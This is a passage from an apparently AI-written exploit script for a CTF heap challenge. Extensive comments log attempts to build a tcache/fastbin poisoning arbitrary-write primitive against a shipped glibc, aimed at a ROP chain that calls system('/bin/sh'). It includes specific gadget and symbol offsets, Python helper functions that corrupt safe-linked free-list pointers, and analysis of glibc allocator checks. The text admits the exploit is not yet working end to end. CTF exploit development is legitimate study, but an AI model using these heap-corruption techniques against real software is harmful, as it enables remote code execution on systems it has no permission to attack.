#       *structurally* always the bottom of whatever list accumulates on
#       top of it, so a 2nd "cover" entry must be freed *after* it, with
#       the corruption applied to whichever entry ends up on top).
#
#   (b) The concrete addresses needed for the final RCE step were all
#       independently computed/verified against the exact shipped
#       `source/libc.so.6` (not guessed):
#         - `environ` (libc-exported, points at the process's own envp
#           array on the stack): offset 0x1f6d00 (via `readelf --dyn-syms`).
#         - A `pop rdi; ret` gadget: libc_base + 0x2d6c2 (via pwntools ROP).
#         - `"/bin/sh"` string: libc_base + 0x1b0ff8.
#         - `system()`: libc_base + 0x4dfa0.
#         - `one_gadget` (installed locally via the `one_gadget` Ruby gem)
#           reports 4 candidates for this exact libc, e.g.
#           `0x4dc78`/`0xf937a` (posix_spawn, needs `rsp&0xf==0`) and
#           `0xdbda2` (execve, needs a writable `rbp-0x40` and a sane
#           argv/envp chain) -- all with register/stack preconditions that
#           are hard to guarantee landing on a *stack-return-address*
#           overwrite (registers at that point hold whatever the last libc
#           call left them with), so the plan was to prefer a classic,
#           deterministic `pop rdi; ret` -> `"/bin/sh"` -> `system()` ROP
#           chain written directly onto the stack *after* a corrupted
#           saved return address (the arbitrary WRITE is length-
#           controllable, not just one pointer, so this is a single
#           post_my_note() call once the target stack slot is known), in
#           preference to gambling on a one-gadget's side constraints.
#
#   (c) What blocked completion: `forge_chunk()`/phase4's heavy heap
#       grooming (two oversized forged chunks, each built from ~10 minted
#       top-chunk extensions, plus a forced unsorted-bin sort via the
#       probe malloc) leaves ALL 10 todo indices in a tangled, mutually-
#       aliased, partially-forged state by the time libc_base is known --
#       and libc ASLR is re-rolled per TCP connection (socat forks a brand
#       new `chall` process per client), so the tcache-poison write MUST
#       reuse indices from that same post-phase4 connection; there is no
#       way to "start fresh" with 10 clean slots. Concretely, reusing any
#       index whose post-phase4 real chunk is the *shrunk-to-minimum*
#       remnant of one of forge_chunk()'s TC/B pairs forces any same-size
#       re-request to GROW (realloc can't satisfy it in place), and while
#       the target tcache bin is still empty that grow's internal
#       malloc() does NOT pull a clean top-chunk extension like it would
#       on a fresh connection -- it is forced into glibc's unsorted-bin
#       scan/sort path instead, because phase4's own forging left a
#       "last_remainder"-style leftover chunk resident there (the tail end
#       of whatever the final probe malloc() didn't consume). That scan
#       path, applied to debris adjacent to the deliberately-forged
#       oversized headers, was observed (locally, against the exact
#       shipped `todo`+`libc.so.6`, run repeatedly under gdb for live
#       inspection) to trip glibc's OWN consistency checks with two
#       different abort messages depending on exactly which index pair was
#       reused for the new virgin-tcache-leak step:
#         - `realloc(): invalid old size`
#         - `malloc(): invalid next->prev_inuse (unsorted)`
#       Switching the first ("P1-establishing") index to one whose
#       post-phase4 real chunk is ALREADY >= the new target size (so that
#       step takes realloc's in-place SHRINK path instead of a GROW --
#       deterministic, never touches the unsorted bin) fixed the first
#       abort, but the SECOND required grow (the one that reclaims that
#       same freshly-freed chunk into a different index, needed to
#       legitimately "own" it for the later corruption write) still
#       forces a GROW while that specific size class is virgin, and still
#       reaches the same unsorted-bin debris. The fully-working fix is
#       very likely "explicitly drain/consume phase4's leftover unsorted-
#       bin remainder (with a few disposable allocations of its own,
#       unrelated size classes) before touching the new, poison-dedicated
#       size class at all" (or equivalently, choose forge_chunk()'s own
#       MINT counts so nothing is left resting in the unsorted bin after
#       the probe) -- reasoned through but NOT YET IMPLEMENTED/VERIFIED
#       end-to-end live. `phase5_tcache_poison_write()` below is left in
#       as the best-effort, partially-verified attempt (the `virgin_leak_
#       and_hold()` helper's OWN leak mechanic, reusing phase1/phase4's
#       already-proven virgin-tcache-fd trick, was confirmed working
#       stand-alone); it is NOT wired into `main()`'s run because it does
#       not yet reliably avoid the abort above. `challenge.yaml`'s `test:`
#       section is intentionally left unwired as a result.
# =============================================================================

# =============================================================================
# Phase 6 (THIS PASS) -- genuine, live-debugged progress on the phase 5
# blocker; still NOT a fully working write primitive, but several real,
# verified root causes and fixes were found this pass (all reproduced
# locally, repeatedly, against the exact shipped `todo` + `libc.so.6`
# under gdb, with a disposable local copy + `patchelf --set-rpath .`).
# `challenge.yaml`'s `test:` section is STILL intentionally left unwired:
# the final write does not yet land reliably. This section documents
# exactly what was fixed and what remains broken, for the next pass.
#
#   (1) CONFIRMED + FIXED: the debris left in the unsorted bin after
#       phase4's probe malloc (a "last_remainder" split off decoy's own
#       largebin chunk) is real and is exactly what the prior pass
#       predicted. It is fixed with ONE extra allocation right after the
#       probe: shrink the probe's own index (idx9) to minimum and regrow
#       it to the SAME size used for the probe's own vehicle index
#       (`t.post(9, 1); t.post(9, 0x78, ...)`). Because that index's next
#       physical neighbour is the still-free last_remainder, this single
#       realloc() grows by FORWARD CONSOLIDATION (glibc's `_int_realloc`
#       directly checks the next chunk's PREV_INUSE bit and, if clear,
#       absorbs the whole thing in one step -- no partial "take nb bytes,
#       re-insert a smaller remainder" cycle is needed here, unlike when
#       draining debris from an UNRELATED chunk, see point 4). This was
#       verified via gdb: `main_arena.bins[0]` (the unsorted-bin sentinel)
#       goes from a genuine heap address (non-empty) to the fixed libc
#       sentinel address (empty) after exactly this one extra step.
#
#   (2) MAJOR NEW ROOT CAUSE (previously misdiagnosed): `realloc()`'s own
#       internal grow path (`_int_realloc()` -> `_int_malloc()`) does
#       **not** consult tcache at all -- tcache retrieval only happens in
#       the public `__libc_malloc()` entry point (via `tcache_get()`),
#       which `_int_realloc()` never calls when it needs to allocate new
#       memory. This was confirmed directly with gdb breakpoints on
#       `_int_malloc`/`_int_realloc`/`malloc_printerr`, single-stepping
#       actual grow calls and inspecting `main_arena.fastbinsY`/`tcache`
#       state at each one. Consequence: `virgin_leak_and_hold()`'s design
#       (shrink an index to minimum, then grow it back to pop a
#       just-freed entry) can therefore NEVER retrieve from **tcache** --
#       it silently falls through to glibc's OTHER retrieval paths
#       (fastbin, smallbin, unsorted-bin scan, or top-chunk extension)
#       instead, found via `_int_malloc()`, which DOES check fastbins
#       directly (both from the public malloc() entry and from realloc()'s
#       internal path -- this is the one bin type consulted either way).
#       FIX: target a size class whose tcache bin is already saturated
#       (count == `tcache_count`, 7 by default) BEFORE doing any of this,
#       so `_int_free()`'s normal insertion logic is forced to spill into
#       the FASTBIN instead of tcache for that class -- fastbins use the
#       identical safe-linking (`PROTECT_PTR`/`REVEAL_PTR`) scheme as
#       tcache, so the whole virgin-leak + corrupt-fd + double-pop
#       mechanic from `virgin_leak_and_hold()`/`phase5_tcache_poison_
#       write()` carries over unchanged, just landing in a fastbin
#       instead of a tcache bin. Several of forge_chunk()'s own classes
#       (chunksize 0x20, 0x40, 0x50 in this build) are already tcache-
#       saturated by the time phase4 finishes, which is convenient but
#       also means those classes already have 1-2 PRE-EXISTING stray
#       fastbin residents (left over from the forging itself) that must
#       be popped out first (via the same forward-growing-index trick)
#       before a chosen class is genuinely virgin for the safe-link
#       degenerate-key trick to work.
#
#   (3) CONFIRMED + FIXED: several `TodoNote[idx]` indices are
#       "radioactive" for ANY further `post()` (realloc) call, even
#       though they are harmless for `read_my_note()` -- specifically the
#       `idx_r`/`idx_r2` indices from each `forge_chunk()` call (indices
#       2, 3, 7 in the standard phase4 layout). Their stale pointer aliases
#       memory that legitimately becomes part of ANOTHER index's real,
#       in-use allocation later (R's own memory is absorbed by the
#       decoy-drain fix in point 1, and by the largebin-sort itself), so
#       any later `realloc()` through them reads garbage as a fake chunk
#       header and corrupts live state (confirmed via gdb: identical
#       setup, same call, crashes ONLY once a prior step has caused the
#       index's target region to be reused/rewritten by something else;
#       the exact same call succeeds in isolation right after phase4).
#       FIX: never call `post()` on these indices again after reading the
#       libc leak; only use indices that stay "legitimate owners"
#       throughout (the two `idx_mint` driver indices and the fresh
#       bootstrap/probe/drain index were confirmed safe to reuse).
#
#   (4) CONFIRMED + FIXED (expensive but deterministic): the `idx_a`/
#       `idx_b` ("TC"/"B") indices from EACH `forge_chunk()` call (0/1 for
#       TARGET, 5/6 for DECOY) sit immediately BEFORE that call's own `R`
#       chunk. For TARGET specifically, `R` is deliberately never touched
#       again after being sorted into its largebin (it is phase4's own
#       persistent libc-leak vehicle via `idx_r2`), so it is still fully
#       intact (its real forged size, e.g. 0x4c0 in a typical run) by the
#       time phase 5 runs -- meaning indices 0/1 sit right next to a huge,
#       genuinely-free chunk and ANY grow through them satisfies via
#       forward consolidation (never reaching `_int_malloc`/fastbins at
#       all, confirmed by checking whether the index's own pointer
#       changes address across a grow -- unchanged = consolidated in
#       place). FIX: deliberately and fully drain that whole chunk first
#       via repeated shrink(1)+regrow() cycles through ONE of those two
#       indices (confirmed: ~10 cycles for a 0x4c0 chunk with a 0x78-sized
#       regrow, verified by watching `main_arena.bins[0]`/`last_remainder`
#       go from a genuine heap address back to the libc sentinel address
#       and STAY there across further cycles). This frees up BOTH indices
#       of that pair to behave like fresh, cleanly-relocating indices
#       afterward. IMPORTANT ORDERING CONSTRAINT found by trial and error:
#       any "pop the stray pre-existing fastbin residents" step (point 2)
#       for a size class MUST run BEFORE this draining, not after --
#       reversing the order corrupts a different class's fastbin-resident
#       chunk header (observed as `free(): invalid fastbin entry (free)`)
#       and was only fixed by moving the stray-entry pops earlier.
#
#   (5) STILL BROKEN / NOT YET SOLVED: with all of (1)-(4) applied, the
#       full `virgin_leak_and_hold()` + `phase5_tcache_poison_write()`
#       chain now runs ALL THE WAY THROUGH without any glibc abort --
#       every individual `post()` call in the sequence returns cleanly,
#       including the final "pop the forged `target` pointer" step. BUT
#       the resulting `TodoNote[idx_k2].ptr` does NOT actually equal the
#       intended `target` address: reading it back via gdb shows it still
#       points at an ordinary HEAP address (one that, suspiciously,
#       contains leftover `'X'` bytes from the point-(4) draining index's
#       own regrow content), not the computed libc `target`. This means
#       `forged_fd = shifted ^ target` is being computed from a `shifted`
#       that does NOT actually equal the real `P_address >> 12` safe-link
#       key -- i.e. the fastbin bin being used for the poison (chosen as
#       chunksize 0x40 in this pass's attempts) was re-verified via gdb to
#       still have a LEFTOVER resident (`fastbinsY[2]` non-null) even
#       after the point-(2) "pop stray entries" step and even after a
#       dedicated loop confirmed (in an isolated repro) that exactly 2
#       pops empty it -- but in the FULL combined sequence (after also
#       running the point-(4) full-drain on indices 0/1), a THIRD stray
#       resident reappears in that same class, likely reintroduced by the
#       point-(4) draining's own internal splitting (it was not re-
#       isolated down to the exact statement before time ran out). The
#       practical effect: `virgin_leak_and_hold()`'s read-back is not
#       reading a virgin (XOR-with-zero) safe-linked value in the full
#       combined run, so the derived `shifted` key is wrong, and the final
#       redirect lands on the WRONG address instead of the intended stack
#       target. NEXT STEP for a future pass: after step (4)'s draining,
#       re-verify (and if needed re-drain, in a loop until genuinely
#       empty, not just once) the SPECIFIC fastbin class chosen for the
#       poison immediately before `virgin_leak_and_hold()` runs, rather
#       than trusting the earlier point-(2) pop to still hold after
#       further heap activity.
#
# `environ` leak target note: once the redirect itself is reliable, reading
# `environ`'s VALUE (not just pointing at it) needs care, because
# `post_my_note()`'s write always fires in the SAME call that establishes
# the new pointer (there is no separate "redirect-only, no write" step).
# The fix verified this pass: target `environ - OFFSET` (OFFSET e.g. 16)
# instead of `environ` directly, and send a short, exact raw payload of
# only OFFSET bytes with NO trailing newline (bypassing `Todo.post()`'s
# convenience wrappers, which always append a trailing byte) so the
# single `read()` inside `readline()` writes only the junk bytes BEFORE
# `environ`, never touching `environ`'s own 8 bytes -- `read_my_note()`
# then prints both the junk and (right after it) environ's untouched,
# genuine value in the same call.
# =============================================================================


def reset_to_min(t, idx):
    """Shrink whatever real chunk `idx` currently aliases down to the
    minimum chunksize (0x20) via a 1-byte request (no content is actually
    written: readline()'s read(fd,buf,0) is a no-op), so a LATER post() of
    a larger size is guaranteed to take realloc()'s GROW path."""
    t.post(idx, 1)


def virgin_leak_and_hold(t, idx_a, idx_b, S):
    """
    Phase1-style virgin-tcache-fd leak, generalized to arbitrary indices:
    idx_a must currently alias a real chunk whose chunksize is ALREADY >=
    request2size(S) (so this takes realloc's in-place SHRINK path, never a
    grow -- avoiding phase4 leftover unsorted-bin interactions). idx_b is
    reset to minimum first, so ITS reclaim of the just-freed chunk is a
    genuine grow/tcache-pop (safe: by the time it runs, the target tcache
    bin already holds the chunk idx_a just freed, so tcache has priority
    over the unsorted bin regardless of what debris is resting there).

    Leaves the bin with exactly 1 resident entry (the chunk, "P"), with
    idx_b's bookkeeping {ptr=P, size=S} intact (dangling-but-readable: P is
    free, but idx_b's own `read_my_note()`/`post_my_note()` calls still
    target it directly). Returns shifted = P>>12 (the safe-linking XOR key
    for P, recovered because the bin is virgin at the moment of the
    leaking free -- see phase1 for the full derivation) or None if the
    leaked bytes came back short (same ~1/256-chance truncation as phase1,
    needs a retry).
    """
    t.post(idx_a, S, b"A" * (S - 8))  # shrink in place; ptr unchanged
    t.post(idx_a, 0)  # free -> tcache bin for this class: count=1, head=P
    reset_to_min(t, idx_b)
    t.post(idx_b, S, b"B" * (S - 8))  # grow -> pops P (tcache, count=0)
    t.post(idx_a, 0)  # re-free P via idx_a's stale ptr: count=1 again, virgin
    out = t.read_all()
    leak = parse_note_line(out, idx_b)
    if not leak or len(leak) < 4:
        return None
    leak_padded = leak + b"\x00" * (8 - len(leak))
    return struct.unpack("<Q", leak_padded)[0]


def phase5_tcache_poison_write(t, idx_a, idx_b, idx_temp, idx_y, idx_k1, idx_k2, S_t, target, payload):
    """
    Best-effort, NOT YET FULLY VERIFIED tcache-poison write primitive (see
    the phase 5 comment block above for the known remaining blocker, and
    the phase 7 comment block below for exactly how far this got fixed
    this pass and the one hard constraint that remains unresolved).

    idx_a must alias a real chunk >= request2size(S_t) (shrink-safe). The
    other 5 indices' prior state matters less but all 6 must reference
    distinct physical addresses at the start, and S_t's resulting
    chunksize must be a class nothing else active still depends on.

    `target` is the address we want a later index's TodoNote[idx].ptr to
    equal (the value `realloc()`/`chunk2mem()` hands back to the caller).
    Internally this must encode `target - 0x10` as the raw fastbin/tcache
    "victim" chunk pointer -- chunk2mem() always adds 2*SIZE_SZ (0x10 on
    x86-64) to turn a chunk pointer into the user-visible pointer. The
    ORIGINAL version of this function (prior pass) computed
    `forged_fd = shifted ^ target` directly, which is off by exactly
    0x10: it would have landed the final pointer at `target + 0x10`, not
    `target`. Fixed this pass (confirmed live under gdb, see phase 7).

    On success, a FRESH index's post() lands `payload` directly at
    `target`; that same fresh index's read_my_note() thereafter is an
    arbitrary-address read.
    """
    shifted = virgin_leak_and_hold(t, idx_a, idx_b, S_t)
    if shifted is None:
        return False

    # Pop P out entirely (tcache bin for S_t's class -> empty).
    reset_to_min(t, idx_temp)
    t.post(idx_temp, S_t, b"T" * (S_t - 8))

    # Free a second, unrelated chunk Y into the now-virgin bin (head=Y, count=1).
    reset_to_min(t, idx_y)
    t.post(idx_y, S_t, b"Y" * (S_t - 8))
    t.post(idx_y, 0)

    # Re-free P (idx_a's stale ptr) ON TOP of Y: head=P, count=2 -- P is
    # NOT the bottom entry this time, so popping it still leaves count=1.
    t.post(idx_a, 0)

    # Corrupt P's own fd/next field via idx_b's stale-but-still-correctly-
    # sized ptr (post_my_note()'s "old size(S_t) < new size(S_t)" check is
    # false, so the pointer-refresh branch is skipped and the write lands
    # at P regardless of what realloc(P, S_t) does -- and since P's real
    # header already matches S_t exactly, realloc is a true no-op here).
    # FIX (this pass): encode (target - 0x10), not target itself -- see
    # the chunk2mem()-offset note in this function's docstring.
    victim_encoded = (target - 0x10) & 0xFFFFFFFFFFFFFFFF
    forged_fd = shifted ^ victim_encoded
    buf = bytearray(b"\x00" * (S_t - 1))
    buf[0:8] = struct.pack("<Q", forged_fd)
    t.post(idx_b, S_t, bytes(buf), exact=True)

    # Pop #1: consumes P (real address), reveals `victim_encoded` (decoding
    # to target-0x10) as the new head.
    reset_to_min(t, idx_k1)
    t.post(idx_k1, S_t, b"K" * (S_t - 8))

    # Pop #2: the fastbin/tcache pop returns `victim_encoded` as the raw
    # chunk pointer; chunk2mem() adds 0x10 back, so realloc() hands back
    # exactly `target` to post_my_note(), which stores it as this index's
    # ptr and then writes `payload` straight there.
    #
    # CRITICAL, STILL-UNRESOLVED CONSTRAINT (see phase 7): this specific
    # pop can ONLY go through `_int_malloc`'s FASTBIN path (never tcache --
    # see phase 6 point (2)), and that path unconditionally validates
    # `fastbin_index(chunksize(victim)) == idx` by reading the 8 bytes
    # already sitting at `target - 0x10 + 8` (i.e. `target - 8`) in real
    # memory. For an arbitrary, attacker-chosen `target` (e.g. a stack
    # address reached via an `environ` leak) those bytes are whatever is
    # genuinely there and will essentially never happen to satisfy this
    # check, aborting with "malloc(): memory corruption (fast)" instead of
    # completing the pop. This function therefore only actually succeeds
    # end-to-end when `target - 8` already holds a plausible S_t-class
    # size (confirmed live: pointing at an existing, legitimately-sized
    # free/in-use chunk's own header works; pointing at an arbitrary stack
    # or libc .data address does not).
    reset_to_min(t, idx_k2)
    assert len(payload) == S_t - 1, (len(payload), S_t)
    t.post(idx_k2, S_t, payload, exact=True)
    return True


# =============================================================================
# Phase 7 (THIS PASS) -- live gdb root-causing of the phase-6 "pop mismatch"
# bug, with 3 real, confirmed, fixed bugs and one hard, still-unresolved
# constraint. Methodology: a disposable local copy of `todo` + `libc.so.6`
# was patched (`patchelf --set-interpreter`, with `libc.so.6` kept in the
# same working directory since the binary's own DT_NEEDED entry is the
# literal relative string "./libc.so.6", not a bare SONAME -- it is loaded
# relative to the process's cwd, not resolved via rpath/ld.so.cache at
# all). A custom gdb Python script set live, auto-continuing breakpoints on
# `_int_malloc`/`_int_free`/`_int_realloc`/`__libc_malloc`/`__libc_realloc`/
# `__libc_free`/`malloc_printerr`, logging `main_arena.fastbinsY[*]` (walked
# and safe-link-decoded by hand, since fastbin `fd` fields use the same
# `PROTECT_PTR`/`REVEAL_PTR` XOR-with-`(&p->fd)>>12` scheme as tcache) and
# `tcache->counts[*]` on every single hit, for every experiment below.
#
#   (1) CONFIRMED, FIXED, root cause of the ACTUAL "stray resident"
#       mystery the prior pass could not pin down: `forge_chunk()`'s
#       `idx_a`/`idx_b` pair (TARGET = indices 0/1, DECOY = indices 5/6)
#       sits physically immediately BEFORE that call's own forged,
#       still-fully-intact largebin chunk. A naive attempt to "flush" a
#       small size class (e.g. 0x40) through `idx_a` -- `reset_to_min()`
#       then regrow back to the small size -- does NOT pop from that small
#       class's fastbin at all: `_int_realloc`'s forward-consolidation
#       check (`next = chunk_at_offset(oldp, oldsize); !inuse(next)`)
#       succeeds directly against the adjacent largebin chunk (it is
#       genuinely free, with a correctly-cleared PREV_INUSE bit on the
#       chunk after it), silently absorbing the ENTIRE largebin chunk and
#       re-splitting a new, still-huge remainder back into the unsorted
#       bin -- `fastbin[idx]` is never even touched. Confirmed live:
#       `t.post(0, 0x38, ...)` right after phase4 produces
#       `realloc oldp=... oldsize=0x20 nb=0x40` immediately followed by
#       `free p=... size=0x4a0`-ish (NOT a fastbin pop), and
#       `fastbinsY[2]` (the 0x40 class) is provably unchanged by it. A
#       LATER `virgin_leak_and_hold()` call targeting that same class then
#       free()s its own "P" chunk ON TOP of the pre-existing, never-
#       actually-flushed stray resident, so the safe-link key read back is
#       computed from a REAL previous-head pointer, not the virgin
#       (NULL-equivalent) key -- exactly the "wrong address popped"
#       symptom the prior pass observed, now precisely traced to this one
#       statement. FIX (confirmed working): issue ONE throwaway regrow
#       through `idx_a` first (lets it consume+disperse the whole large
#       neighbour, isolating it onto an ordinary, non-adjacent chunk), THEN
#       a second shrink+regrow through the SAME index correctly reaches
#       and pops the small class's fastbin, because it is no longer
#       sitting next to anything large and free.
#
#   (2) CONFIRMED, FIXED: naively reusing one scratch index for BOTH the
#       initial "pop P out of the bin" step AND the later "pop P again
#       (after it has been re-frozen and its fd corrupted), revealing the
#       forged target" step is unsafe, EVEN THOUGH the two uses are
#       temporally far apart. The index's stale pointer still equals P's
#       address the whole time; its own `reset_to_min()` (a plain
#       `post(idx, 1)`) silently SHRINKS P's real header (rewriting its
#       recorded chunksize) at the exact moment P is simultaneously the
#       live fastbin head -- nothing unlinks it from the bin just because
#       its header got resized out from under it. The very next pop then
#       reads a corrupted chunksize and aborts with "malloc(): memory
#       corruption (fast)" (confirmed live, reproduced twice). FIX: use a
#       genuinely different index (one that aliases the throwaway "Y"
#       chunk, not P, at that point) for the second pop -- reusing THAT
#       one instead is safe, because by then Y has already been
#       permanently orphaned (P's fd was already overwritten to skip past
#       it), so shrinking Y's header has no observable effect on anything
#       still reachable.
#
#   (3) CONFIRMED, FIXED: picking an arbitrary already-used index for the
#       FINAL "pop target" step is unsafe if that index's own prior real
#       chunksize happens to produce a `reset_to_min()` shrink byproduct
#       that lands in the SAME class being poisoned -- it reinserts a
#       stray entry on top of the carefully-prepared single-entry bin,
#       and the final pop consumes that stray instead of the intended
#       target (confirmed live: reusing DECOY's mint-driver index, whose
#       resting chunksize was 0x60, produces an exact 0x60-0x20=0x40
#       byproduct on every `post(idx,1)`, directly recontaminating a 0x40-
#       class poison attempt, observed as "invalid fastbin entry (free)").
#       FIX: reuse an index whose current real chunksize, after
#       `reset_to_min()`, produces a byproduct OUTSIDE the poisoned class
#       (e.g. the same "Y" index from fix (2), which is already pinned at
#       exactly S_t after its own pop, so its byproduct is always
#       S_t-0x20 -- a fixed, harmless, unrelated class).
#
#   (4) CONFIRMED, FIXED (latent bug, independent of (1)-(3)): the
#       `forged_fd = shifted ^ target` computation already present in
#       `phase5_tcache_poison_write()` was off by exactly `0x10`.
#       `chunk2mem()` always adds `2*SIZE_SZ` (0x10 on x86-64) when
#       handing a popped chunk back to the caller, so the raw value that
#       must be encoded into the corrupted `fd` field is `target - 0x10`,
#       not `target` itself -- otherwise the final `TodoNote[idx].ptr`
#       ends up `target + 0x10`, i.e. exactly the "popped pointer does not
#       equal the intended forged address" symptom the task description
#       named. Fixed directly in `phase5_tcache_poison_write()` above.
#
#   (5) STILL UNRESOLVED, and now believed to be a genuinely hard
#       constraint of this exact primitive, not a bug: `_int_realloc`'s
#       grow path can ONLY ever retrieve a popped chunk through
#       `_int_malloc`'s FASTBIN fast-path (confirmed in phase 6, point 2:
#       it never calls `tcache_get()`). That fastbin-pop code
#       unconditionally validates
#       `fastbin_index(chunksize(victim)) == idx` by reading the 8 bytes
#       already resident at `target - 8` in real memory, where `victim =
#       target - 0x10` is the raw pointer the corrupted `fd` must encode.
#       For a genuinely arbitrary, attacker-chosen `target` (a stack
#       address reached via an `environ` leak, or any ordinary libc/.data
#       byte range) those 8 bytes are whatever already happens to be
#       there and essentially never coincidentally satisfy this check --
#       confirmed live with `target` pointing into libc's own small rw-p
#       segment: every attempt aborts with "malloc(): memory corruption
#       (fast)" before the pointer is ever handed back. Pointing `target`
#       at an address that IS already a legitimately-sized, real chunk
#       (so `target - 8` genuinely holds a valid size for the class)
#       works every time, which positively confirms fixes (1)-(4) and the
#       overall mechanism are correct -- the ONLY missing piece is a way
#       to make the real destination's `target - 8` bytes look like a
#       valid size *before* this final pop runs. For a stack destination
#       this is not reachable with any primitive this challenge exposes
#       (the heap-relative stale-pointer OOB write from phase 2 cannot
#       reach the stack at all). A plausible, NOT yet implemented next
#       step: redirect first at a SELF-CHOSEN, heap-reachable scratch
#       address whose `-8` bytes are pre-written (via the existing phase 2
#       OOB write) to a valid-looking size for the class, confirm THAT
#       lands correctly, and use the resulting genuine arbitrary
#       read/write there to hunt for a stack-adjacent value (e.g. via an
#       auxv entry's small `type` field, which legitimately sits in the
#       fastbin size range for some entries) that can serve as a second,
#       real stepping stone toward `environ`/the stack -- reasoned through
#       but NOT implemented or verified this pass. Flag NOT recovered;
#       `challenge.yaml`'s `test:` section is intentionally left unwired.
# =============================================================================

# =============================================================================
# Phase 8 (THIS PASS) -- revisited phase 7's "hard constraint" on explicit
# instruction to try alternatives. Methodology: a disposable local copy of
# `todo` + `libc.so.6` (patchelf'd interpreter, `libc.so.6` kept alongside
# since the binary's DT_NEEDED is the literal relative string "./libc.so.6")
# was driven directly with pwntools' own `process()` -- NOT gdb this time.
# Crucially: a parent process can read a direct child's `/proc/<pid>/mem`
# with NO ptrace_scope restriction at all (Yama's "restricted" default only
# blocks *non-ancestor* tracers; gdb attaching from a sibling shell is a
# non-ancestor and was reliably refused this pass with "ptrace: No such
# process" -- consistent, not a transient issue). This let every claim below
# be checked against live, ground-truth process memory on every run, far
# faster than a gdb-breakpoint harness.
#
# === BOTH requested alternatives were pursued; both made genuine, verified
# progress; NEITHER is fully wired end-to-end to the flag. ===
#
#   (A) TCACHE-RETRIEVAL REDESIGN -- CONFIRMED CORRECT, but blocked on a
#       precisely-quantified index-budget shortfall (not a mechanism flaw).
#
#     (A.1) CONFIRMED BY DISASSEMBLY (not just reasoning): `__libc_realloc`
#           (libc+0x9bb70) literally does, for `bytes != 0`:
#               test   rbx, rbx        ; rbx = oldmem
#               je     <tail-call to __libc_malloc>
#           i.e. `realloc(NULL, n)` is a genuine tail call into the PUBLIC
#           `__libc_malloc` entry point -- not into `_int_malloc` directly.
#           `__libc_malloc` (libc+0x9b370) has its OWN inlined tcache fast
#           path, BEFORE ever calling `_int_malloc`:
#               movzwl (%rdx,%rbp,2), %ecx     ; ecx = tcache->counts[tc_idx]
#               test   %cx, %cx
#               je     <fall through to _int_malloc>
#               lea    0x10(%rbp), %rdi
#               mov    (%rdx,%rdi,8), %rax     ; rax = tcache->entries[tc_idx] (= e, verbatim)
#               test   $0xf, %al               ; ONLY check: is e 16-byte aligned?
#               jne    <"malloc(): unaligned tcache chunk detected">
#               ... decode e's own in-chunk "next" field, store as new head ...
#               ret                             ; returns e AS-IS, untouched
#           THIS IS THE KEY FINDING: there is **no `fastbin_index(chunksize(e))`
#           check anywhere in this path** -- the only validation on `e` itself
#           is a 4-bit alignment test. This is categorically different from,
#           and strictly weaker than, the fastbin retrieval path's
#           `fastbin_index(chunksize(victim)) == idx` check (which reads real
#           bytes at `target-8` and is what blocked phases 5-7). Verified live:
#           corrupting a chunk's own in-tcache "next" field and retrieving it
#           through a genuinely virgin (`TodoNote[idx].ptr == NULL`) index's
#           `post()` call lands `TodoNote[idx].ptr` on an arbitrary,
#           16-byte-aligned target with **zero dependency on what bytes
#           already exist there** -- this was reproduced locally, repeatedly,
#           including for a target address chosen with NO relationship to any
#           real chunk (confirmed via `/proc/<pid>/mem`: `TodoNote[idx].ptr`
#           ends up bit-for-bit equal to the chosen target, every time).
#
#     (A.2) CONFIRMED: `_int_free`'s tcache-insertion path stores the chunk's
#           own **user pointer** (`chunk2mem(p)`, i.e. `p+0x10`) directly into
#           `tcache->entries[tc_idx]` -- disassembly of `_int_free`
#           (libc+0x98a80) shows `lea 0x10(%rbx), %r9` (rbx=chunk ptr) then
#           `mov %r9, 0x80(%rax,%rcx,8)` (storing into the entries array) with
#           NO further adjustment. This means (unlike phases 5-7's fastbin
#           math) the tcache-poison `forged_fd` must encode `target` directly
#           -- NOT `target - 0x10` -- when the corrupted chunk is popped via
#           `tcache_get()`. (Fastbin's `chunk2mem()`-offset correction from
#           phase 7 point (4) does NOT apply to this tcache-based redesign.)
#
#     (A.3) CONFIRMED (and the actual, fully-isolated remaining blocker):
#           `tcache_get()`'s own fast-path check (`counts[tc_idx] > 0`) means
#           this mechanism inherently needs: one real build+free (any index,
#           need not be virgin) to create "C"; ONE VIRGIN pop to consume a
#           second, pre-existing cover entry "Y" is NOT required to be
#           virgin-built (a normal tainted mint-driver index works fine for
#           building/freeing both "C" and "Y" -- verified live, no abort);
#           but the two **retrieval** steps absolutely must each go through
#           `tcache_get()`, and `tcache_get()` is ONLY reached via
#           `__libc_malloc`'s public entry point, which is ONLY reached via
#           `post()` when `TodoNote[idx].ptr` is a literal, never-touched-
#           since-process-start NULL (per (A.1); the dangling-pointer bug
#           means NO already-used index's `ptr` can ever become NULL again).
#           So: pop #1 (consume the corrupted "C", revealing the forged
#           decode as the tcache head) and pop #2 (retrieve that forged
#           value as `TodoNote[idx].ptr`) each independently consume one
#           genuinely virgin index -- 2 virgin indices, no way around it,
#           confirmed by exhausting every reuse idea below.
#
#           Budget, counted exactly: the PROVEN, reliable libc leak (phase 4,
#           target+decoy forging) needs 9 indices (target: a,b,r,r2,mint;
#           decoy: a,b,r,mint -- decoy genuinely cannot share ANY of target's
#           five indices: reusing target's idx_a/idx_b for decoy's own
#           TC/B pair was tried live and aborts with "double free or
#           corruption (fasttop)", because target's idx_a's immediate
#           physical neighbour IS target's own (still-intact, needed-for-the-
#           leak) forged largebin chunk -- any grow through it forward-
#           consolidates into that neighbour instead of reaching a fresh
#           class. Reusing target's idx_mint for decoy's own mint loop was
#           ALSO tried live: no abort, but the computed `fake_size` silently
#           came out wrong and the final libc_base comparison MISMATCHED,
#           because `forge_chunk()`'s fake_size arithmetic hard-assumes
#           `idx_mint`'s very first chunk is carved **contiguously
#           immediately after** that SAME call's own R -- a reused,
#           elsewhere-positioned index breaks that contiguity assumption
#           silently (no crash, just wrong math) rather than erroring out).
#           One additional, genuine saving WAS found and verified live this
#           pass: dropping the separate "bootstrap" allocation entirely
#           (target's own first `post()` call is simply the very first
#           malloc of the process, verified to produce an identical
#           `fake_size=0x4c0` either way) and reusing an already-tainted
#           index (not a fresh one) as the sort-triggering "probe" (a plain
#           `post(idx,1); post(idx, probe_size, ...)` on target's own mint-
#           driver index works fine as the probe vehicle) together free up
#           EXACTLY the one index that bootstrap+probe used to jointly
#           occupy. Net: 9 used, 1 genuinely virgin index remains. The
#           tcache-retrieval mechanism needs 2. **We are short by exactly
#           one virgin index**, not by a conceptual gap -- this is a
#           precise, re-derivable number, not a vague "ran out of ideas".
#
#     (A.4) Everything else tried to close that last gap:
#           - Reusing phase-6/7-style "safe to reuse" tainted indices
#             (target's own idx_mint, decoy's own idx_mint) for building "C"
#             and "Y" inside the NEW tcache chain: works fine, verified live
#             (these are legitimate savings, already folded into the budget
